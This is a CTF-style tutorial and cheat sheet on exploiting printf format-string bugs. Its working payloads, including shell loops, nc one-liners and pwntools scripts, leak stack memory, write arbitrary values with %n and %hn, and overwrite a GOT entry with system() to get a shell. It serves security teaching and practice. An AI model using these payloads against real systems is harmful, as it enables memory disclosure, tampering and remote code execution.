# Format String (`printf(input)`)

## Goal
Your text is used as printf's format: `%x` / `%p` print stack slots, `%s` prints the string a slot points to, `%n` WRITES to where a slot points.

## New to this? Read once (2 minutes)
`printf` is the C function that prints text. Its first argument is a **format**: text with `%` codes, each of which means "take the next value from my list and print it this way". Written correctly it is `printf("%s", input)`: your text is only data. Written wrongly it is `printf(input)`: your text IS the format, so every `%` code you type gets obeyed.

But the program gave printf no list of values. So printf takes them from where the list would have been: the **stack**, the program's scratch memory, one **slot** after another (slot 1, slot 2, …). Whatever happens to be lying there comes out:
```text
you type:   %p.%p.%p.%p
it prints:  0x40.0xf7f8a5c0.0x8049216.0x41414141        ← slot 1, slot 2, slot 3, slot 4 of the program's memory
```
The slots hold local variables (maybe the flag itself), saved addresses, and pointers (= a slot whose value is the address of something else).

| You want | You type | Because |
|---|---|---|
| to check the bug exists | `%p.%p.%p.%p` | hex numbers come back instead of your text → vulnerable |
| to see memory | `%p` (one slot as hex) | the flag may be lying in the slots as text → section A |
| to follow a pointer and read text there | `%s` | a slot holds the ADDRESS of the flag → section B |
| to change a variable | `%n` | writes a number to the address a slot holds → sections C, D |
| one particular slot | `%7$p` `%7$s` `%7$n` | `7$` = "use slot 7", instead of typing six `%p` first |

Words used below: **slot** = one position on the stack (4 bytes on 32-bit, 8 on 64-bit) · **leak** = make the program print memory it should not · **pointer** = a value that is the address of something · **slot number** = which position; it is the same on every connection, so find it once and reuse it.

It worked when the reply contains the flag, or a line a normal run never shows ("granted", "unlocked"). A reply that stops early or is empty = that slot crashed the program: normal, try the next slot.

**Fast path (toolkit)**
```bash
python3 bof-scripts/go.py $IP $PORT ./chall chall.c paper.txt                         # front door: give what you have; none is fine
python3 bof-scripts/fmtpwn.py $IP $PORT --binary ./chall                              # format string only: leak, %n write, GOT.  --pre 2 = answer a menu first
ctf --fmt-remote $IP:$PORT                                                            # classmate's kit: every slot as number / text, rebuilds a flag on the stack
python3 bof-scripts/fmtwrite.py $IP $PORT --addr 0x<target> --value 0x<value>          # write an exact value.  Help: bof-scripts/RUNBOOK.md section 1c
```
All scripts: [15_scripts](15_scripts.md).

Run these FIRST. Flag printed → done. "NO FLAG" or nothing after ~3 minutes → by hand below.

**Checklist**
- [ ] confirm: send `%p.%p.%p.%p` → hex comes back = vulnerable
- [ ] goal from source: flag sits in a local array → A · pointer to flag on stack → B · a variable must change → C / D
- [ ] slot number brute-forced 1…40, fresh connection per try
- [ ] 64-bit → `%p` / `%lx`, never `%x` (it drops half of each slot)

| Spec | Does |
|---|---|
| `%x` `%p` | print next stack slot as hex |
| `%lx` | same, full 8 bytes (64-bit) |
| `%s` | slot = address → print the text there (crash on a non-address is normal) |
| `%n` | slot = address → write there the number of characters printed so far |
| `%7$p` | use slot 7 directly; works with any letter: `%7$s` `%7$n` |
| `%100c` | print 100 characters (sets what the next `%n` writes) |
| `%hn` | like `%n` but writes only 2 bytes |

Addresses change every connection (ASLR). SLOT NUMBERS do not → find the slot once, reuse it.

# Do this, in order (by hand)
```bash
export IP=<host> PORT=<port>                       # 1. once per terminal tab
nc $IP $PORT                                       # 2. connect once, type hello, look at what it does with your text. Ctrl+C to leave
echo '%p.%p.%p.%p' | nc -w3 $IP $PORT              # 3. the test. Hex numbers (0x… or (nil)) come back = format-string bug. Your text comes back unchanged = not this page → 12_bof.md
grep -nE 'printf *\(|fgets|gets|read\(|scanf|fopen|char .*\[|if *\(|strcmp|system' chall.c     # 4. given the source? the lines that matter
```
5. In the source, find where the flag is and what must happen for it to print, then pick the section:

| In the source | Means | Go |
|---|---|---|
| flag file is read into an array (`fgets(flag, …, f)`) BEFORE the `printf(buf)` | the flag text is lying on the stack | A |
| a `char *` points at the flag / secret, or the flag buffer is passed to the function as an argument | the stack holds the flag's address | B |
| `if (var != 0)` / `if (var == N)` and a pointer to `var` is passed in (`f(&var)`) or `p = &var` | change `var` through a pointer that is already there | C |
| same `if`, but `var` is a global and the service PRINTS its address (or you have the binary) | you must supply the address yourself | D |
| no flag code at all; the program calls another function on your text after the printf | make that function be `system` | E |

6. No source → try A, then B, then C, in that order: each is one loop over the slots and you just look for the flag in the output.
7. No flag → Helpline at the bottom.

# A. Leak the stack (flag was read into a local array)
**What is happening:** the program already read the flag into a variable. Variables live on the stack, and `%p` prints stack slots, so the flag comes out as hex numbers. Each number is a few characters of the flag, stored backwards; the snippet turns them back into text.
Dump slots 1–40 (one connection each), then decode all of it; the flag shows up as readable text between dots:
```bash
for i in $(seq 1 40); do echo "@@%$i\$p" | nc -w3 $IP $PORT | grep -aoE '@@.*' | cut -c3-; done > leak.txt ; tr '\n' ' ' < leak.txt
python3 -c "
import sys
for w in sys.argv[1:]:
    w=w.replace('0x',''); w='0'*(len(w)%2)+w
    sys.stdout.write(''.join(chr(b) if 32<=b<127 else '.' for b in bytes.fromhex(w)[::-1]))
print()" $(grep 0x leak.txt)
```
By hand: `echo '%6$lx %7$lx %8$lx %9$lx' | nc -w3 $IP $PORT` → hex words made of text bytes (20–7e) are the flag, each word stored reversed (`0x67616c66` = `flag`) → paste those words after the snippet instead of `$(grep 0x leak.txt)`.

# B. A pointer to the flag is on the stack → `%s`
**What is happening:** the flag is NOT in the slots, but one slot holds its address. `%s` means "go to the address in this slot and print the text there". You do not know which slot, so try them all; one of them prints the flag.
Typical: flag buffer passed as a function argument, or `char *secret = "…"`.
```bash
for i in $(seq 1 40); do echo "$i $(echo "@@%$i\$s" | nc -w3 $IP $PORT | grep -aoE '@@.*' | cut -c3- | strings | head -1)"; done    # slot that prints the flag
echo '%x%x%x%x%x%x-%s' | nc -w3 $IP $PORT          # same without $: six %x skip slots 1–6, %s reads slot 7 → add / remove %x
```
Empty lines = that slot crashed (not an address) → normal.

# C. Change a variable, pointer already on the stack → `%n`
**What is happening:** the flag prints only if a variable has a certain value, and you cannot type into that variable. `%n` writes a number (how many characters were printed so far) to the address held in a slot. One slot already holds the variable's address, so `%n` on that slot changes the variable.
Sign in source: `p = &var;` then `if (var != 0x…) win();` (or `== small number`).
```bash
for i in $(seq 1 40); do echo "$i: $(printf "A%%$i\$n\nx\n" | nc -w3 $IP $PORT | tail -3 | tr '\n' ' ')"; done   # slot where the output changes / wins
printf 'A%%11$n\nx\n' | nc -w3 $IP $PORT           # fire the slot found (here 11). Second line "x" answers a 2nd prompt, harmless otherwise
echo '%x%x%n' | nc -w3 $IP $PORT                   # same without $: writes through slot 3
echo '%50c%7$n' | nc -w3 $IP $PORT                 # variable must become exactly 50 → print 50 chars first
```
**The `A` in front matters**: `%n` writes how many characters were printed so far. Nothing before it → it writes 0 → a check like `if (var != 0)` still fails. `%x%x%n` works for the same reason (the `%x` print something).
Slot can be high (20–30) when the buffer is big → sweep to 40. In `printf` every `%` is typed `%%`. Most slots crash (not an address) → normal, keep going.
Faster than brute: service prints the variable's address → find the slot whose `%p` shows that same address → use that slot with `%n`.

# D. Write to an address YOU supply
**What is happening:** same as C, but no slot holds the variable's address. Your own input also sits on the stack, so you TYPE the address as the first bytes of your input, find which slot shows your input (step 1), and point `%n` at that slot (step 2).
1. Where does your own input sit? `echo 'AAAA.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p' | nc -w3 $IP $PORT` → slot K shows `0x41414141`
2. Put the target address (reversed) where AAAA was, write through slot K:
```bash
python3 -c 'import sys; sys.stdout.buffer.write(b"\x1c\xc0\x04\x08" + b"%4$n\n")' | nc -w3 $IP $PORT          # target 0x0804c01c, K=4 → writes 4
python3 -c 'import sys; sys.stdout.buffer.write(b"\x1c\xc0\x04\x08" + b"%96c%4$n\n")' | nc -w3 $IP $PORT      # writes 100 (4 + 96)
```
Target address only known at run time (service prints it) → parse and send in ONE connection:
```python
from pwn import *
import re
io = remote("IP", PORT)
io.recvuntil(b"at ")                               # text right before the printed address
addr = int(re.search(rb"[0-9a-fx]+", io.recvline()).group(), 16)
io.sendline(p32(addr) + b"%4$n")                   # 4 = K
print(io.recvall(timeout=2).decode(errors="replace"))
```
Big exact value (e.g. `0xcafebabe`, or a function address into the GOT) → two 2-byte writes:
```text
lo = value & 0xffff      hi = value >> 16      before = bytes printed before the first %c (8 for the two addresses + any prefix)
payload = <addr reversed><addr+2 reversed> %<(lo-before) mod 65536>c %K$hn %<(hi-lo) mod 65536>c %<K+1>$hn      (no spaces)
example: 0xcafebabe → 0x0804c01c, K=4:   \x1c\xc0\x04\x08\x1e\xc0\x04\x08%47798c%4$hn%4160c%5$hn
```
→ let `bof-scripts/fmtwrite.py` do the arithmetic.

# E. GOT overwrite → `system()` (lab pattern)
**What is happening:** the lab-sheet exercise, run on your own machine. A program finds library functions through a table of addresses (the GOT). Using the write from D, you replace one entry with the address of `system`, so the next time the program calls that function on your text it runs your text as a command.
Program calls another function on your string after the printf (e.g. `strdup(b)`) → make that function be `system`.
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space          # ASLR off, or prefix every run with: setarch -R
objdump -R ./chall | grep strdup                               # first column = GOT slot of the function to replace → got
gdb -q ./chall                                                 # inside gdb:  b main  |  run AAAA  |  p system   → val
./chall 'sh;#AAAA.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p'               # slot that shows 0x41414141 → K
./chall "$(python3 -c '
import sys,struct
got=0x0804c008; val=0xf7db6000; K=2; before=12                 # before = 4 ("sh;#") + 8 (two addresses)
lo=val&0xffff; hi=val>>16
sys.stdout.buffer.write(b"sh;#"+struct.pack("<II",got,got+2)+b"%%%dc%%%d$hn%%%dc%%%d$hn"%((lo-before)%65536,K,(hi-lo)%65536,K+1))')"
```
A screen of blanks, then it waits = you are in `sh` → type `id`. Same snippet = calculator for D: drop `b"sh;#"`, set `before=8`.

# Crash on purpose
`%s%s%s%s%s%s%s%s` → reads garbage addresses → segmentation fault.

### Helpline
```bash
# %p comes back as literal "%p" → not a format bug (input is printed safely) → look for an overflow instead: [12_bof](12_bof.md).
# input length tiny (fgets(buf,8)) → use the short $ forms: %7$n is 4 characters.
# shell eats $ → single quotes: echo '%7$p'. Inside double quotes write \$ . In printf write %%7$n inside single quotes.
# %s / %n on a slot that isn't an address = crash → expected, just try the next slot.
# 64-bit: an address has 00 bytes → cannot go at the START of the input (printf stops at 00); use toolkit / put it last.
# service closes before printing → add a second line or sleep: (echo '%7$p'; sleep 1) | nc $IP $PORT
# leak looks half-right on 64-bit → you used %x; switch to %lx / %p.
```
